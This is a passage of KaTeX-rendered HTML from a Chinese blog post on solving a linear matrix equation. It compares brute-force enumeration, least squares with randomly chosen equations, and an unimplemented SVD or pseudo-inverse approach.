style=\"top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span>，但是这 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">2m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord mathnormal\">m</span></span></span></span> 个向量 在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-X2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span> 中的排列分布对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>x</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-x2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span> 是否可逆是有影响的，这是经过尝试验证的。</p>\n<p>具体步骤如下：</p>\n<ol>\n<li>暴力枚举 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>C</mi><mi>n</mi><mi>m</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">C_{n}^{m}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.93033em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.664392em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span> 选，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个向量不排列组成 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">X1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span></span></span></span>。</li>\n<li>暴力枚举 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>X</mi><mi>m</mi><mrow><mi>n</mi><mo>−</mo><mi>m</mi></mrow></msubsup></mrow><annotation encoding=\"application/x-tex\">X_{m}^{n-m}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0183309999999999em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.771331em;\"><span style=\"top:-2.4530000000000003em;margin-left:-0.07847em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">−</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span></span></span></span> 排列 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 个向量组成 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">X2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span></span></span></span>。</li>\n<li>检查 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-X2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span> 是否可逆。</li>\n</ol>\n<blockquote>\n<p>这个做法不太好，比较慢，这一过程还能优化吗？</p>\n</blockquote>\n<h2 id=\"思路二\"><a class=\"anchor\" href=\"#思路二\">#</a> 思路二</h2>\n<p>这一方法基于<mark>非方阵</mark>矩阵方程的最小二乘法解法，对于如下形式的矩阵方程，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 不再是方阵：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>X</mi><mo>⋅</mo><mi>L</mi><mo>=</mo><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">X\\cdot L = Y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span></span></p>\n<p>解形式为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy=\"false\">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><msup><mo stretchy=\"false\">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>X</mi><mi>T</mi></msup><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">L = (X^{T}X)^{-1}X^{T}Y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1413309999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span></span></p>\n<p>这里要求 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X^{T}X)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0913309999999998em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span></span></span></span> 可逆。这就和上一个思路要求 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-X2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span> 可逆很像。</p>\n<p>在这种情况下，求解用的矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的行数不再有限制，而且当然越多越好，越能保证最终是可逆的。那么干脆就用上所有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个方程，就让 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的行数为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>。但是还需要消去 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>，经过尝试发现消去 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span> 所用的方程也会影响最终 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X^{T}X)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0913309999999998em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span></span></span></span> 的可逆性。那么这里也需要暴力枚举各种排列组合了么？</p>\n<p>为了比上一个思路更快，尝试在这一步随机选择消去 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span> 所用的方程，实践发现随机选取得到的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X^{T}X)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0913309999999998em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span></span></span></span> 是可逆的情况是稠密的，总是能够很快求解成功。</p>\n<h2 id=\"思路三\"><a class=\"anchor\" href=\"#思路三\">#</a> 思路三</h2>\n<blockquote>\n<p>只是想法，并没有实现</p>\n</blockquote>\n<p>依然是基于<mark>非方阵</mark>矩阵方程的求解。</p>\n<p>实际上，目前我已知的<mark>非方阵</mark>矩阵方程的求解就只有两种办法:</p>\n<ul>\n<li>最小二乘法</li>\n<li>奇异值分解 (SVD)(伪逆)</li>\n</ul>\n<p>那么采取奇异值分解，或者说伪逆的办法也是可以的。</p>\n<p>对于一个任意的矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span>（大小为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">n \\times m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span>），可以进行奇异值分解：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>X</mi><mo>=</mo><mi>U</mi><mi mathvariant=\"normal\">Σ</mi><msup><mi>V</mi><mi>T</mi></msup></mrow><annotation encoding=\"application/x-tex\">X = U \\Sigma V^T\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8913309999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\">Σ</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中：</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>U</mi></mrow><annotation encoding=\"application/x-tex\">U</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span></span></span></span> 是一个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n \\times n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span 